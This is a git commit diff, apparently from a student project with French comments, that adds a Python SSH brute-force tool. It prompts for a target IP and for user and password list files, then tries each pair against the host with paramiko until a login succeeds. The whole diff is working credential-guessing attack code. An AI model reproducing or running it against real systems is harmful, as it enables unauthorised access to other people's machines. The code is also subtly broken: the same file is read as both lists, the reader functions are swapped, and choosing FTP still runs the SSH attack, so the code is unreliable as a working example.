6320c07ebbd16b7a36db3a4cb89d64add1927f83
Chantal-live-campus-MCS <166163595+Chantal-live-campus-MCS@users.noreply.github.com>
2024-04-11 18:01:55 +0200

    Add files via upload

--- Projet1.py
+++ Projet1.py
@@ -1,20 +1,76 @@
+import os
+import paramiko
+import socket
+import time
 
-
+def brute_force_ssh(host, p, user, passwd):
+    clt = paramiko.SSHClient()
+    clt.load_system_host_keys()
+    clt.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        print(f"Testing {user}:{passwd}")
+        clt.connect(host, p, user, passwd, timeout=3)
+    except socket.error as error:
+        print("SocketError", error)
+        return False
+    except paramiko.AuthenticationException as exception:
+        print ("AuthenticationException", exception)
+        return False
+    except paramiko.SSHException:
+        print ("Try again")
+        time.sleep(20)
+        return brute_force_ssh(host, p, user, passwd)
+    else:
+        return True
 def connection():
-    adresse_IP = input ("Donner l'adresse IP: ")
-    nom_utilisateur = input ("Donner le nom d'utilisateur: ")
-    return adresse_IP, nom_utilisateur
+    adresse_IP = input ("Donner l'adresse IP: ") #adresse IP de la machine cible
+    return adresse_IP
+
+def get_port(service):
+    try:
+        return socket.getservbyname(service)
+    except socket.error:
+        return None
 
 def choisir_protocole():
     while True:
         protocole = input ("Quel protocole voulez-vous choisir, SSH ou FTP? ").lower() #lower() va convertir la reponse en miniscules, sinon si l'utilisateur écrit le protocole en miniscule et non pas en majuscue on doit obtenir la phrase d'entrer un autre protocole 
         if protocole in ['ssh', 'ftp']:
-           return protocole
+           if protocole =='ssh':
+               port = get_port('ssh')
+           elif protocole == 'ftp':
+               port = get_port('ftp')   
+           return protocole, port
         else:
             print("Le protocole doit être SSH ou bien FTP, Veuillez réessayer")
-def path_fichier():
-    path = input("Entrez le path du fichier: ")
-    return path
+def path_users_list():
+    while True:
+        path = input("Entrez le path du fichier de liste des utilisateurs : ")
+        if os.path.isfile(path):
+            return path
+        else:
+            print("Ce n'est pas un fichier valide.")
+
+def acceder_users_list(path):
+    try:
+        with open(path, 'r', encoding="utf-8") as file:
+            users = file.readlines()
+            users = [user.strip() for user in users] # Supprimer les espaces vides et les sauts de ligne
+            return users
+    except FileNotFoundError:
+        print("Fichier non trouvé")        
+    except OSError:
+        print("Fichier non accessible")
+    except Exception as ex:
+        print(f"L'erreur '{ex}' s'est produite")
+
+def path_passwords_list():
+    while True:
+        path = input("Entrez le path du fichier: ")
+        if os.path.isfile(path):
+            return path
+        else:
+            print("Ce n'est pas un fichier valide.")
 
 def acceder_password_file(path):
     try:
@@ -22,6 +78,8 @@ def acceder_password_file(path):
              passwords = file.readlines()
     
              passwords = [password.strip() for password in passwords] # Supprimer les espaces vides et les sauts de ligne
+             
+             
              return passwords
     except FileNotFoundError:
         print("fichier non trouvé")        
@@ -31,24 +89,28 @@ def acceder_password_file(path):
 
     except Exception as ex:
         print(f"L'erreur '{ex}' s'est produite")
-   
+
 
 def main():
-    adresse_IP, nom_utilisateur = connection()
+    adresse_IP = connection()
     print("L'adresse IP est:", adresse_IP)
-    print("le nom d'utilisateur est:", nom_utilisateur)
-
-    protocole = choisir_protocole()
-    print("Le protocole choisit est: ", protocole)
     
-    path = path_fichier()
-    acceder_password_file(path)
-    common_passwords = acceder_password_file(path)
-    if common_passwords:
-     print("Liste de mots de passe couramment utilisés :")
-     print(common_passwords)  #pour afficher les 10 premiers mots de passe
+
+    protocole, port = choisir_protocole()
+    print(f"Vous avez choisi le protocole {protocole} sur le port {port}")
+    path = path_users_list()
+    path = path_passwords_list()
+    users = acceder_password_file(path)
+    passwords = acceder_users_list(path)
+    if users and passwords:
+        for user in users:
+            for password in passwords:
+                if brute_force_ssh(adresse_IP, port, user, password):
+                    return
+        print("Aucun mot de passe trouvé.")
     else:
-     print("Aucune liste de mots de passe récupérée.")
+        print("Aucune liste de mots de passe ou d'utilisateurs récupérée.")
+     
 main()
 
     
